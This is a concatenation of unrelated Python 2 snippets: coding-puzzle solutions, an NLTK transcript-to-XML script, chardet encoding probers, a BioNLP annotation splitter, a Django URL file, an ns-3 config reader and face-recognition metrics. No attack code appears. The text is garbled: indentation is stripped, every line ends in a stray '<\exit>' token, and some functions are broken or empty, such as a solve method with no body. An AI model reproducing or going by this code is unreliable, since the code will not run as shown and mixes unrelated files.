s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve_TLE(self, cipher):<\exit>
a = cipher[0]<\exit>
counter = 0<\exit>
for i in xrange(len(a)):<\exit>
if a[i] == "0":<\exit>
continue<\exit>
for j in xrange(i, len(a)):<\exit>
strength = a[i:j + 1]<\exit>
strength = int(strength)<\exit>
if strength & (strength - 1) == 0:<\exit>
counter += 1<\exit>
return counter<\exit>
def solve(self, cipher):<\exit>
def strength(self, a, i, j):<\exit>
if a[i] == 0:<\exit>
return 0<\exit>
value = 0<\exit>
for k in xrange(i, j + 1):<\exit>
value = value * 10 + a[k]<\exit>
return value<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip().split(' ')<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import nltk.data<\exit>
import os<\exit>
from nltk.tokenize.punkt import PunktWordTokenizer<\exit>
from nltk.stem.porter import *<\exit>
import math<\exit>
sent_detector = nltk.data.load('tokenizers/punkt/english.pickle')<\exit>
stemmer = PorterStemmer()<\exit>
text_auto = []<\exit>
text_nonauto = []<\exit>
print 'Processing datat in'<\exit>
directory = os.path.dirname(os.path.realpath(__file__)) + '/raw_data/cleaned'<\exit>
print 'dir:'+directory<\exit>
for root, dirs, files in os.walk(directory):<\exit>
for file in files:<\exit>
if file.endswith(".txt") and (not ('(1)' in file)) and (not ('-2' in file)):<\exit>
f=open(os.path.join(root,file), 'r')<\exit>
text_nonauto.append((file,f.read()))<\exit>
f.close()<\exit>
elif file.endswith(".txt"):<\exit>
f=open(os.path.join(root,file), 'r')<\exit>
text_auto.append((file,f.read()))<\exit>
f.close()<\exit>
if not os.path.exists('Sents_split/non_auto/'):<\exit>
os.makedirs('Sents_split/non_auto/')<\exit>
if not os.path.exists('Sents_split/auto/'):<\exit>
os.makedirs('Sents_split/auto/')<\exit>
for ind, (video, text) in enumerate(text_nonauto):<\exit>
xml_nonauto = '[non-automatic.xml]\n<transcripts>\n'<\exit>
video = video[:(video.find('[English]'))]<\exit>
url = text[:text.strip().find('\n')]<\exit>
text = text[text.strip().find('\n'):]<\exit>
sents = sent_detector.tokenize(text.strip())<\exit>
cleaned = '<transcript'+' id=\"'+ str(ind+1)+ '\" title=\"'+video+'\" url=\"'+ url + '\" mode=\"non-automatic\">\n'<\exit>
for s in sents:<\exit>
s = s.replace('\n',' ') +'\n'<\exit>
s = s.replace('.',' ')<\exit>
s = s.lower()<\exit>
cleaned += s<\exit>
temp = PunktWordTokenizer().tokenize(s)<\exit>
cleaned += '</transcript>\n'<\exit>
xml_nonauto+= cleaned+'</transcripts>'<\exit>
f = open('Sents_split/non_auto/'+str(ind+1)+'.txt','w')<\exit>
f.write(xml_nonauto)<\exit>
f.close()<\exit>
for ind, (video, text) in enumerate(text_auto):<\exit>
xml_auto = '[automatic.xml]\n<transcripts>\n'<\exit>
video = video[:(video.find('[English]'))]<\exit>
url = text[:text.strip().find('\n')]<\exit>
text = text[text.strip().find('\n'):]<\exit>
sents = sent_detector.tokenize(text.strip())<\exit>
cleaned = '<transcript'+' id=\"'+ str(ind+1) + '\" title=\"'+video+'\" url=\"'+ url + '\" mode=\"automatic\">\n'<\exit>
for s in sents:<\exit>
s = s.replace('\n',' ') +'\n'<\exit>
s = s.replace('.',' ')<\exit>
s = s.lower()<\exit>
cleaned += s<\exit>
cleaned += '</transcript>\n'<\exit>
xml_auto+= cleaned+'</transcripts>'<\exit>
f = open('Sents_split/auto/'+str(ind+1)+'.txt','w')<\exit>
f.write(xml_auto)<\exit>
f.close()<\exit>
from datetime import datetime<\exit>
import pytz<\exit>
class TimeParser():<\exit>
dt_formats = [<\exit>
'%Y-%m-%d %H:%M:%S %Z',<\exit>
'%Y-%m-%d %H:%M:%S',<\exit>
]<\exit>
def parse(self, dt_str, dt_format):<\exit>
return datetime.strptime(dt_str, dt_format)<\exit>
def localtime(utc_dt, tz_str):<\exit>
tz = pytz.timezone(tz_str)<\exit>
local_dt = tz.normalize(utc_dt.astimezone(tz))<\exit>
return local_dt<\exit>
def utctime(dt, tz_str):<\exit>
tz = pytz.timezone(tz_str)<\exit>
local_dt = tz.localize(dt)<\exit>
utc_dt = pytz.utc.normalize(local_dt.astimezone(pytz.utc))<\exit>
return utc_dt<\exit>
from . import ansi<\exit>
import os<\exit>
import math<\exit>
def _get_terminal_columns():<\exit>
_, columns = os.popen('stty size', 'r').read().split()<\exit>
return int(columns)<\exit>
def erase():<\exit>
ansi.move_cursor_line_beggining()<\exit>
ansi.erase_from_cursor_to_end()<\exit>
def refresh(state):<\exit>
erase()<\exit>
lines, num_rows = _construct_output(state)<\exit>
for line in lines:<\exit>
print(line)<\exit>
ansi.move_cursor_previous_lines(num_rows)<\exit>
ansi.move_cursor_horizental(len(lines[0])+1)<\exit>
ansi.flush()<\exit>
def _construct_output(state):<\exit>
columns = _get_terminal_columns()<\exit>
def number_of_rows(line):<\exit>
return int(math.ceil(float(len(line))/columns))<\exit>
displayed_lines = []<\exit>
num_rows = 0<\exit>
prompt_line = 'Path: ' + state.input<\exit>
displayed_lines.append(prompt_line)<\exit>
num_rows += number_of_rows(prompt_line)<\exit>
matches = state.get_matches()<\exit>
if matches:<\exit>
selected_command_index = matches.index(state.get_selected_match())<\exit>
matches_to_display = matches[max(0, selected_command_index - 10 + 1):max(10, selected_command_index + 1)]<\exit>
for index, m in enumerate(matches_to_display):<\exit>
fm = ' ' + m<\exit>
num_rows += number_of_rows(fm)<\exit>
for w in state.input.split(' '):<\exit>
if w:<\exit>
fm = fm.replace(w, ansi.bold_text(w))<\exit>
if m == state.get_selected_match():<\exit>
fm = ansi.select_text(fm)<\exit>
displayed_lines.append(fm)<\exit>
else:<\exit>
not_found_line = 'Nothing found'<\exit>
displayed_lines.append(not_found_line)<\exit>
num_rows += number_of_rows(not_found_line)<\exit>
return displayed_lines, num_rows<\exit>
class TreeNode(object):<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Solution(object):<\exit>
def generateTrees(self, n):<\exit>
return self.dfs(1, n+1)<\exit>
def dfs(self, s, e):<\exit>
ret = []<\exit>
if s >= e:<\exit>
return [None]<\exit>
for i in xrange(s, e):<\exit>
ls = self.dfs(s, i)<\exit>
rs = self.dfs(i+1, e)<\exit>
for l in ls:<\exit>
for r in rs:<\exit>
root = TreeNode(i)<\exit>
root.left = l<\exit>
root.right = r<\exit>
ret.append(root)<\exit>
return ret<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.cache = {}<\exit>
def numTrees(self, n):<\exit>
return self.dfs(n)<\exit>
def dfs(self, n):<\exit>
if n not in self.cache:<\exit>
if n in (0, 1, 2):<\exit>
self.cache[n] = max(1, n)<\exit>
else:<\exit>
s = 0<\exit>
for i in xrange(1, n+1):<\exit>
l = self.dfs(i-1)<\exit>
r = self.dfs(n-i)<\exit>
s += l*r<\exit>
self.cache[n] = s<\exit>
return self.cache[n]<\exit>
if __name__ == "__main__":<\exit>
print Solution().numTrees(3)<\exit>
from . import constants<\exit>
import sys<\exit>
from .latin1prober import Latin1Prober<\exit>
from .mbcsgroupprober import MBCSGroupProber<\exit>
from .sbcsgroupprober import SBCSGroupProber<\exit>
from .escprober import EscCharSetProber<\exit>
import re<\exit>
MINIMUM_THRESHOLD = 0.20<\exit>
ePureAscii = 0<\exit>
eEscAscii = 1<\exit>
eHighbyte = 2<\exit>
class UniversalDetector:<\exit>
def __init__(self):<\exit>
self._highBitDetector = re.compile(b'[\x80-\xFF]')<\exit>
self._escDetector = re.compile(b'(\033|~{)')<\exit>
self._mEscCharSetProber = None<\exit>
self._mCharSetProbers = []<\exit>
self.reset()<\exit>
def reset(self):<\exit>
self.result = {'encoding': None, 'confidence': 0.0}<\exit>
self.done = False<\exit>
self._mStart = True<\exit>
self._mGotData = False<\exit>
self._mInputState = ePureAscii<\exit>
self._mLastChar = b''<\exit>
if self._mEscCharSetProber:<\exit>
self._mEscCharSetProber.reset()<\exit>
for prober in self._mCharSetProbers:<\exit>
prober.reset()<\exit>
def feed(self, aBuf):<\exit>
if self.done:<\exit>
return<\exit>
aLen = len(aBuf)<\exit>
if not aLen:<\exit>
return<\exit>
if not self._mGotData:<\exit>
if aBuf[:3] == '\xEF\xBB\xBF':<\exit>
self.result = {'encoding': "UTF-8", 'confidence': 1.0}<\exit>
elif aBuf[:4] == '\xFF\xFE\x00\x00':<\exit>
self.result = {'encoding': "UTF-32LE", 'confidence': 1.0}<\exit>
elif aBuf[:4] == '\x00\x00\xFE\xFF':<\exit>
self.result = {'encoding': "UTF-32BE", 'confidence': 1.0}<\exit>
elif aBuf[:4] == '\xFE\xFF\x00\x00':<\exit>
self.result = {<\exit>
'encoding': "X-ISO-10646-UCS-4-3412",<\exit>
'confidence': 1.0<\exit>
}<\exit>
elif aBuf[:4] == '\x00\x00\xFF\xFE':<\exit>
self.result = {<\exit>
'encoding': "X-ISO-10646-UCS-4-2143",<\exit>
'confidence': 1.0<\exit>
}<\exit>
elif aBuf[:2] == '\xFF\xFE':<\exit>
self.result = {'encoding': "UTF-16LE", 'confidence': 1.0}<\exit>
elif aBuf[:2] == '\xFE\xFF':<\exit>
self.result = {'encoding': "UTF-16BE", 'confidence': 1.0}<\exit>
self._mGotData = True<\exit>
if self.result['encoding'] and (self.result['confidence'] > 0.0):<\exit>
self.done = True<\exit>
return<\exit>
if self._mInputState == ePureAscii:<\exit>
if self._highBitDetector.search(aBuf):<\exit>
self._mInputState = eHighbyte<\exit>
elif ((self._mInputState == ePureAscii) and<\exit>
self._escDetector.search(self._mLastChar + aBuf)):<\exit>
self._mInputState = eEscAscii<\exit>
self._mLastChar = aBuf[-1:]<\exit>
if self._mInputState == eEscAscii:<\exit>
if not self._mEscCharSetProber:<\exit>
self._mEscCharSetProber = EscCharSetProber()<\exit>
if self._mEscCharSetProber.feed(aBuf) == constants.eFoundIt:<\exit>
self.result = {<\exit>
'encoding': self._mEscCharSetProber.get_charset_name(),<\exit>
'confidence': self._mEscCharSetProber.get_confidence()<\exit>
}<\exit>
self.done = True<\exit>
elif self._mInputState == eHighbyte:<\exit>
if not self._mCharSetProbers:<\exit>
self._mCharSetProbers = [MBCSGroupProber(), SBCSGroupProber(),<\exit>
Latin1Prober()]<\exit>
for prober in self._mCharSetProbers:<\exit>
if prober.feed(aBuf) == constants.eFoundIt:<\exit>
self.result = {'encoding': prober.get_charset_name(),<\exit>
'confidence': prober.get_confidence()}<\exit>
self.done = True<\exit>
break<\exit>
def close(self):<\exit>
if self.done:<\exit>
return<\exit>
if not self._mGotData:<\exit>
if constants._debug:<\exit>
sys.stderr.write('no data received!\n')<\exit>
return<\exit>
self.done = True<\exit>
if self._mInputState == ePureAscii:<\exit>
self.result = {'encoding': 'ascii', 'confidence': 1.0}<\exit>
return self.result<\exit>
if self._mInputState == eHighbyte:<\exit>
proberConfidence = None<\exit>
maxProberConfidence = 0.0<\exit>
maxProber = None<\exit>
for prober in self._mCharSetProbers:<\exit>
if not prober:<\exit>
continue<\exit>
proberConfidence = prober.get_confidence()<\exit>
if proberConfidence > maxProberConfidence:<\exit>
maxProberConfidence = proberConfidence<\exit>
maxProber = prober<\exit>
if maxProber and (maxProberConfidence > MINIMUM_THRESHOLD):<\exit>
self.result = {'encoding': maxProber.get_charset_name(),<\exit>
'confidence': maxProber.get_confidence()}<\exit>
return self.result<\exit>
if constants._debug:<\exit>
sys.stderr.write('no probers hit minimum threshhold\n')<\exit>
for prober in self._mCharSetProbers[0].mProbers:<\exit>
if not prober:<\exit>
continue<\exit>
sys.stderr.write('%s confidence = %s\n' %<\exit>
(prober.get_charset_name(),<\exit>
prober.get_confidence()))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
try:<\exit>
import argparse<\exit>
except ImportError:<\exit>
from os.path import basename<\exit>
from sys import path as sys_path<\exit>
sys_path.append(join_path(basename(__file__), '../server/lib'))<\exit>
import argparse<\exit>
DEBUG=True<\exit>
class ArgumentError(Exception):<\exit>
def __init__(self, s):<\exit>
self.errstr = s<\exit>
def __str__(self):<\exit>
return 'Argument error: %s' % (self.errstr)<\exit>
class SyntaxError(Exception):<\exit>
def __init__(self, line, errstr=None, line_num=None):<\exit>
self.line = line<\exit>
self.errstr = errstr<\exit>
self.line_num = str(line_num) if line_num is not None else "(undefined)"<\exit>
def __str__(self):<\exit>
return 'Syntax error on line %s ("%s")%s' % (self.line_num, self.line, ": "+self.errstr if self.errstr is not None else "")<\exit>
class ProcessingError(Exception):<\exit>
pass<\exit>
class Annotation(object):<\exit>
COMMENT_TYPE = "<COMMENT>"<\exit>
_typere = re.compile(r'^([a-zA-Z][a-zA-Z0-9_-]*)\b')<\exit>
@staticmethod<\exit>
def _parse_type(s):<\exit>
if not s or s[0].isspace():<\exit>
raise SyntaxError(s, "ID missing")<\exit>
if s[0].isalnum() or s[0] == '*':<\exit>
fields = s.split("\t")<\exit>
if len(fields) < 2:<\exit>
raise SyntaxError(s, "No TAB in annotation")<\exit>
m = Annotation._typere.search(fields[1])<\exit>
if not m:<\exit>
raise SyntaxError(s, "Failed to parse type in \"%s\"" % fields[1])<\exit>
return m.group(1)<\exit>
elif s[0] == '#':<\exit>
return Annotation.COMMENT_TYPE<\exit>
else:<\exit>
raise SyntaxError(s, "Unrecognized ID")<\exit>
def __init__(self, s):<\exit>
self.ann_string = s<\exit>
self.type = Annotation._parse_type(s)<\exit>
def __str__(self):<\exit>
return self.ann_string<\exit>
def argparser():<\exit>
ap=argparse.ArgumentParser(description="Split merged BioNLP ST annotations into separate files.")<\exit>
ap.add_argument("-a1", "--a1types", default="Protein", metavar="TYPE[,TYPE...]", help="Annotation types to place into .a1 file")<\exit>
ap.add_argument("-a2", "--a2types", default="[OTHER]", metavar="TYPE[,TYPE...]", help="Annotation types to place into .a2 file")<\exit>
ap.add_argument("-d", "--directory", default=None, metavar="DIR", help="Output directory")<\exit>
ap.add_argument("-s", "--skipempty", default=False, action="store_true", help="Skip output for empty split files")<\exit>
ap.add_argument("-i", "--idrewrite", default=False, action="store_true", help="Rewrite IDs following BioNLP ST conventions")<\exit>
ap.add_argument("files", nargs='+', help="Files in merged BioNLP ST-flavored standoff")<\exit>
return ap<\exit>
def parse_annotations(annlines, fn="(unknown)"):<\exit>
annotations = []<\exit>
for ln, l in enumerate(annlines):<\exit>
if not l.strip():<\exit>
print >> sys.stderr, "Warning: ignoring empty line %d in %s" % (ln, fn)<\exit>
continue<\exit>
try:<\exit>
annotations.append(Annotation(l))<\exit>
except SyntaxError, e:<\exit>
raise SyntaxError(l, e.errstr, ln)<\exit>
return annotations<\exit>
DEFAULT_TYPE = "<DEFAULT>"<\exit>
def split_annotations(annotations, typemap):<\exit>
d = {}<\exit>
for a in annotations:<\exit>
if a.type in typemap:<\exit>
t = a.type<\exit>
elif DEFAULT_TYPE in typemap:<\exit>
t = DEFAULT_TYPE<\exit>
else:<\exit>
raise ArgumentError("Don't know where to place annotation of type '%s'" % a.type)<\exit>
s = typemap[t]<\exit>
if s not in d:<\exit>
d[s] = []<\exit>
d[s].append(a)<\exit>
return d<\exit>
def type_mapping(arg):<\exit>
m = {}<\exit>
for suff, typestr in (("a1", arg.a1types),<\exit>
("a2", arg.a2types)):<\exit>
for ts in typestr.split(","):<\exit>
t = ts if ts != "[OTHER]" else DEFAULT_TYPE<\exit>
if t in m:<\exit>
raise ArgumentError("Split for '%s' ambiguous (%s or %s); check arguments." % (ts, m[t], suff))<\exit>
m[t] = suff<\exit>
return m<\exit>
def output_file_name(fn, directory, suff):<\exit>
import os.path<\exit>
dir, base = os.path.split(fn)<\exit>
root, ext = os.path.splitext(base)<\exit>
if not directory:<\exit>
directory = dir<\exit>
return os.path.join(directory, root+"."+suff)<\exit>
def annotation_lines(annotations):<\exit>
return [str(a) for a in annotations]<\exit>
def write_annotation_lines(fn, lines):<\exit>
with open(fn, 'wt') as f:<\exit>
for l in lines:<\exit>
f.write(l)<\exit>
def read_annotation_lines(fn):<\exit>
with open(fn) as f:<\exit>
return f.readlines()<\exit>
def verify_split(origlines, splitlines):<\exit>
orig = origlines[:]<\exit>
split = []<\exit>
for k in splitlines:<\exit>
split.extend(splitlines[k])<\exit>
orig.sort()<\exit>
split.sort()<\exit>
orig_only = []<\exit>
split_only = []<\exit>
oi, si = 0, 0<\exit>
while oi < len(orig) and si < len(split):<\exit>
if orig[oi] == split[si]:<\exit>
oi += 1<\exit>
si += 1<\exit>
elif orig[oi] < split[si]:<\exit>
orig_only.append(orig[oi])<\exit>
oi += 1<\exit>
else:<\exit>
assert split[si] < orig[si]<\exit>
split_only.append(split[si])<\exit>
si += 1<\exit>
while oi < len(orig):<\exit>
orig_only.append(orig[oi])<\exit>
oi += 1<\exit>
while si < len(split):<\exit>
split_only.append(split[si])<\exit>
si += 1<\exit>
difference_found = False<\exit>
for l in split_only:<\exit>
print >> sys.stderr, "Split error: split contains extra line '%s'" % l<\exit>
difference_found = True<\exit>
for l in orig_only:<\exit>
if l.strip() == "":<\exit>
continue<\exit>
print >> sys.stderr, "Split error: split is missing line '%s'" % l<\exit>
difference_found = True<\exit>
if difference_found:<\exit>
raise ProcessingError<\exit>
def process_file(fn, typemap, directory, mandatory):<\exit>
annlines = read_annotation_lines(fn)<\exit>
annotations = parse_annotations(annlines)<\exit>
splitann = split_annotations(annotations, typemap)<\exit>
for t in mandatory:<\exit>
splitann[t] = splitann.get(t, [])<\exit>
splitlines = {}<\exit>
for suff in splitann:<\exit>
splitlines[suff] = annotation_lines(splitann[suff])<\exit>
if DEBUG:<\exit>
verify_split(annlines, splitlines)<\exit>
for suff in splitann:<\exit>
ofn = output_file_name(fn, directory, suff)<\exit>
write_annotation_lines(ofn, splitlines[suff])<\exit>
def main(argv=None):<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
try:<\exit>
typemap = type_mapping(arg)<\exit>
except ArgumentError, e:<\exit>
print >> sys.stderr, e<\exit>
return 2<\exit>
if arg.skipempty:<\exit>
mandatory_outputs = []<\exit>
else:<\exit>
mandatory_outputs = ["a1", "a2"]<\exit>
for fn in arg.files:<\exit>
try:<\exit>
process_file(fn, typemap, arg.directory, mandatory_outputs)<\exit>
except IOError, e:<\exit>
print >> sys.stderr, "Error: failed %s, skip processing (%s)" % (fn, e)<\exit>
except SyntaxError, e:<\exit>
print >> sys.stderr, "Error: failed %s, skip processing (%s)" % (fn, e)<\exit>
except:<\exit>
print >> sys.stderr, "Fatal: unexpected error processing %s" % fn<\exit>
raise<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main())<\exit>
class Solution:<\exit>
def updateBits(self, n, m, i, j):<\exit>
mask = ((1<<32)-1)-((1<<j+1)-1)+((1<<i)-1)<\exit>
ret = (n&mask)+(m<<i)<\exit>
return self.twos_comp(ret, 32)<\exit>
@staticmethod<\exit>
def twos_comp(val, bits):<\exit>
if val > 0 and val&(1<<(bits-1)) != 0:<\exit>
val -= 1<<bits<\exit>
return val<\exit>
if __name__ == "__main__":<\exit>
assert Solution().updateBits(-2147483648, 2147483647, 0, 30) == -1<\exit>
assert Solution().updateBits(1, -1, 0, 31) == -1<\exit>
n = int("10000000000", 2)<\exit>
m = int("10101", 2)<\exit>
assert bin(Solution().updateBits(n, m, 2, 6)) == "0b10001010100"<\exit>
from django.conf.urls import include, url<\exit>
from django.contrib import admin<\exit>
from django.views.generic import TemplateView<\exit>
from rake_app import views as rake_views<\exit>
urlpatterns = [<\exit>
url(r'^admin/', include(admin.site.urls)),<\exit>
url(r'^$', rake_views.MainView.as_view()),<\exit>
url(r'^about/$', TemplateView.as_view(template_name="about.html"))<\exit>
]<\exit>
from . import constants<\exit>
from .charsetprober import CharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .mbcssm import UTF8SMModel<\exit>
ONE_CHAR_PROB = 0.5<\exit>
class UTF8Prober(CharSetProber):<\exit>
def __init__(self):<\exit>
CharSetProber.__init__(self)<\exit>
self._mCodingSM = CodingStateMachine(UTF8SMModel)<\exit>
self.reset()<\exit>
def reset(self):<\exit>
CharSetProber.reset(self)<\exit>
self._mCodingSM.reset()<\exit>
self._mNumOfMBChar = 0<\exit>
def get_charset_name(self):<\exit>
return "utf-8"<\exit>
def feed(self, aBuf):<\exit>
for c in aBuf:<\exit>
codingState = self._mCodingSM.next_state(c)<\exit>
if codingState == constants.eError:<\exit>
self._mState = constants.eNotMe<\exit>
break<\exit>
elif codingState == constants.eItsMe:<\exit>
self._mState = constants.eFoundIt<\exit>
break<\exit>
elif codingState == constants.eStart:<\exit>
if self._mCodingSM.get_current_charlen() >= 2:<\exit>
self._mNumOfMBChar += 1<\exit>
if self.get_state() == constants.eDetecting:<\exit>
if self.get_confidence() > constants.SHORTCUT_THRESHOLD:<\exit>
self._mState = constants.eFoundIt<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
unlike = 0.99<\exit>
if self._mNumOfMBChar < 6:<\exit>
for i in range(0, self._mNumOfMBChar):<\exit>
unlike = unlike * ONE_CHAR_PROB<\exit>
return 1.0 - unlike<\exit>
else:<\exit>
return unlike<\exit>
import os<\exit>
from PIL import Image<\exit>
import numpy as np<\exit>
import random<\exit>
def read_image(filename):<\exit>
imarr = np.array([])<\exit>
try:<\exit>
im = Image.open(os.path.join(filename))<\exit>
im = im.convert("L")<\exit>
imarr = np.array(im, dtype=np.uint8)<\exit>
except IOError as (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Cannot open image."<\exit>
return imarr<\exit>
def asRowMatrix(X):<\exit>
if len(X) == 0:<\exit>
return np.array([])<\exit>
total = 1<\exit>
for i in range(0, np.ndim(X[0])):<\exit>
total = total * X[0].shape[i]<\exit>
mat = np.empty([0, total], dtype=X[0].dtype)<\exit>
for row in X:<\exit>
mat = np.append(mat, row.reshape(1, -1), axis=0)<\exit>
return np.asmatrix(mat)<\exit>
def asColumnMatrix(X):<\exit>
if len(X) == 0:<\exit>
return np.array([])<\exit>
total = 1<\exit>
for i in range(0, np.ndim(X[0])):<\exit>
total = total * X[0].shape[i]<\exit>
mat = np.empty([total, 0], dtype=X[0].dtype)<\exit>
for col in X:<\exit>
mat = np.append(mat, col.reshape(-1, 1), axis=1)<\exit>
return np.asmatrix(mat)<\exit>
def minmax_normalize(X, low, high, minX=None, maxX=None, dtype=np.float):<\exit>
if minX is None:<\exit>
minX = np.min(X)<\exit>
if maxX is None:<\exit>
maxX = np.max(X)<\exit>
minX = float(minX)<\exit>
maxX = float(maxX)<\exit>
X = X - minX<\exit>
X = X / (maxX - minX)<\exit>
X = X * (high - low)<\exit>
X = X + low<\exit>
return np.asarray(X, dtype=dtype)<\exit>
def shuffle(X, y):<\exit>
idx = np.argsort([random.random() for i in xrange(y.shape[0])])<\exit>
return X[:, idx], y[idx]<\exit>
def shuffle_array(X, y):<\exit>
idx = np.argsort([random.random() for i in xrange(len(y))])<\exit>
X = [X[i] for i in idx]<\exit>
y = [y[i] for i in idx]<\exit>
return X, y<\exit>
def to_col_vec(row_vec):<\exit>
return row_vec[:, np.newaxis]<\exit>
def to_row_vec(col_vec):<\exit>
return col_vec.reshape(1, -1)<\exit>
import os<\exit>
import sys<\exit>
def get_list_from_file(file_path, list_name):<\exit>
list = []<\exit>
if os.path.exists(file_path):<\exit>
file_in = open(file_path, "r")<\exit>
list_string = ""<\exit>
parsing_multiline_list = False<\exit>
for line in file_in:<\exit>
if list_name in line or parsing_multiline_list:<\exit>
list_string += line<\exit>
if ']' not in list_string:<\exit>
parsing_multiline_list = True<\exit>
else:<\exit>
list = eval(list_string.split('=', 1)[1].strip())<\exit>
break<\exit>
file_in.close()<\exit>
return list<\exit>
def get_bool_from_file(file_path, bool_name, value_if_missing):<\exit>
if os.path.exists(file_path):<\exit>
file_in = open(file_path, "r")<\exit>
bool_found = False<\exit>
for line in file_in:<\exit>
if bool_name in line:<\exit>
bool = eval(line.split('=', 1)[1].strip())<\exit>
bool_found = True<\exit>
break<\exit>
file_in.close()<\exit>
if bool_found:<\exit>
return bool<\exit>
else:<\exit>
return value_if_missing<\exit>
def read_config_file():<\exit>
modules_enabled  = ['all_modules']<\exit>
examples_enabled = False<\exit>
tests_enabled    = False<\exit>
config_file_exists = False<\exit>
dot_ns3rc_name = '.ns3rc'<\exit>
dot_ns3rc_path = dot_ns3rc_name<\exit>
if not os.path.exists(dot_ns3rc_path):<\exit>
dot_ns3rc_path = os.path.expanduser('~/') + dot_ns3rc_name<\exit>
if not os.path.exists(dot_ns3rc_path):<\exit>
return (config_file_exists, modules_enabled, examples_enabled, tests_enabled)<\exit>
config_file_exists = True<\exit>
modules_enabled = get_list_from_file(dot_ns3rc_path, 'modules_enabled')<\exit>
if not modules_enabled:<\exit>
modules_enabled = ['all_modules']<\exit>
value_if_missing = False<\exit>
examples_enabled = get_bool_from_file(dot_ns3rc_path, 'examples_enabled', value_if_missing)<\exit>
value_if_missing = False<\exit>
tests_enabled = get_bool_from_file(dot_ns3rc_path, 'tests_enabled', value_if_missing)<\exit>
return (config_file_exists, modules_enabled, examples_enabled, tests_enabled)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N = int(cipher[0])<\exit>
height = 1<\exit>
for cycle in xrange(N):<\exit>
if cycle & 1 == 0:<\exit>
height *= 2<\exit>
else:<\exit>
height += 1<\exit>
return height<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = sys.stdin<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip().split(' ')<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from __future__ import absolute_import<\exit>
import math as math<\exit>
import random as random<\exit>
import logging<\exit>
import cv2<\exit>
import numpy as np<\exit>
from facerec_py.facerec.model import PredictableModel, AbstractPredictableModel<\exit>
from util.commons_util.fundamentals.generators import frange<\exit>
class TFPN(object):<\exit>
def __init__(self, TP=0, FP=0, TN=0, FN=0):<\exit>
self.rates = np.array([TP, FP, TN, FN], dtype=np.double)<\exit>
@property<\exit>
def TP(self):<\exit>
return self.rates[0]<\exit>
@TP.setter<\exit>
def TP(self, value):<\exit>
self.rates[0] = value<\exit>
@property<\exit>
def FP(self):<\exit>
return self.rates[1]<\exit>
@FP.setter<\exit>
def FP(self, value):<\exit>
self.rates[1] = value<\exit>
@property<\exit>
def TN(self):<\exit>
return self.rates[2]<\exit>
@TN.setter<\exit>
def TN(self, value):<\exit>
self.rates[2] = value<\exit>
@property<\exit>
def FN(self):<\exit>
return self.rates[3]<\exit>
@FN.setter<\exit>
def FN(self, value):<\exit>
self.rates[3] = value<\exit>
def __add__(self, other):<\exit>
return self.rates + other.rates<\exit>
def __iadd__(self, other):<\exit>
self.rates += other.rates<\exit>
return self<\exit>
def shuffle(X, y):<\exit>
idx = np.argsort([random.random() for _ in xrange(len(y))])<\exit>
X = [X[i] for i in idx]<\exit>
y = y[idx]<\exit>
return X, y<\exit>
def slice_2d(X, rows, cols):<\exit>
return [X[i][j] for j in cols for i in rows]<\exit>
def precision(true_positives, false_positives):<\exit>
return accuracy(true_positives, 0, false_positives, 0)<\exit>
def accuracy(true_positives, true_negatives, false_positives, false_negatives, description=None):<\exit>
true_positives = float(true_positives)<\exit>
true_negatives = float(true_negatives)<\exit>
false_positives = float(false_positives)<\exit>
false_negatives = float(false_negatives)<\exit>
if (true_positives + true_negatives + false_positives + false_negatives) < 1e-15:<\exit>
return 0.0<\exit>
return (true_positives + true_negatives) / (true_positives + false_positives + true_negatives + false_negatives)<\exit>
class ValidationResult(object):<\exit>
def __init__(self, true_positives, true_negatives, false_positives, false_negatives, description):<\exit>
self.true_positives = true_positives<\exit>
self.true_negatives = true_negatives<\exit>
self.false_positives = false_positives<\exit>
self.false_negatives = false_negatives<\exit>
self.description = description<\exit>
def __div(self, x, y):<\exit>
if y < 1e-15:<\exit>
return 0.0<\exit>
return x/y<\exit>
@property<\exit>
def TPR(self):<\exit>
return self.__div(self.true_positives, self.true_positives+self.false_negatives)<\exit>
@property<\exit>
def FPR(self):<\exit>
return self.__div(self.false_positives, self.false_positives+self.true_negatives)<\exit>
@property<\exit>
def recall(self):<\exit>
return self.__div(self.true_positives, self.true_positives+self.false_negatives)<\exit>
@property<\exit>
def precision(self):<\exit>
return self.__div(self.true_positives, self.true_positives+self.false_positives)<\exit>
@property<\exit>
def total(self):<\exit>
return self.true_negatives+self.true_positives+self.false_negatives+self.false_positives<\exit>
@property<\exit>
def accuracy(self):<\exit>
return self.__div(self.true_positives+self.true_negatives, self.total)<\exit>
@property<\exit>
def F1(self):<\exit>
return self.__div(2*self.precision*self.recall, self.precision+self.recall)<\exit>
def __repr__(self):<\exit>
return "ValidationResult (Description=%s, Precision=%.2f%%, Recall=%.2f%%, TPR=%.2f%%, FPR=%.2f%%, TP=%d, TN=%d, FP=%d, FN=%d)" % (<\exit>
self.description, self.precision*100, self.recall*100, self.TPR*100, self.FPR*100, self.true_positives, self.true_negatives, self.false_positives, self.false_negatives)<\exit>
class ValidationStrategy(object):<\exit>
def __init__(self, model):<\exit>
if not isinstance(model, AbstractPredictableModel):<\exit>
raise TypeError("Validation can only validate the type PredictableModel.")<\exit>
self.model = model<\exit>
self.validation_results = []<\exit>
def add(self, validation_result):<\exit>
self.validation_results.append(validation_result)<\exit>
def validate(self, X, y, description):<\exit>
raise NotImplementedError("Every Validation module must implement the validate method!")<\exit>
def print_results(self):<\exit>
print self.model<\exit>
